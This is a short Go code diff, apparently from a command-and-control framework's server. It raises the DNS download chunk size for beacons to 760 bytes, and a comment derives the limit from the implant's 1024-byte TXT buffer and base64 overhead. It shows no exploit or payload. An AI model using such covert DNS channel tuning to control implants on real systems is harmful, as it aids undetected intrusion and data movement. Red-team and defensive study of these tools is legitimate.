@@ -32,7 +32,18 @@ const (
 	seqXorMask      uint32 = 0x39913991
 	maxUploadSize   uint32 = 0x200000 // 2MB
 	maxDownloadSize uint32 = 0x12c0000
-	dnsSafeChunkSize       = 280
+	// dnsSafeChunkSize is the max payload size (before the 8-byte frame
+	// header) we encode per DNS response during downloads. The beacon's
+	// DnsQueryTXTRecord concatenates every TXT sub-string across every
+	// TXT RR in a response into a single caller-provided buffer of
+	// 1024 bytes (Dns.cc line ~434, KhAlloc(1024) passed as outMax).
+	// Base64 expansion 4/3: raw-binary ceiling = 1024*3/4 = 768 bytes.
+	// Minus the 8-byte [total:4][offset:4] frame header = 760 bytes of
+	// usable payload. Picking 760 puts us at the architectural maximum
+	// for existing deployed beacons (~2.7x the old 280). To go higher,
+	// the beacon RX buffer at Dns.cc:434 must be raised in sync AND a
+	// fresh agent re-deployed on the target.
+	dnsSafeChunkSize       = 760
 	defaultChunkSize       = 1024
 )
 
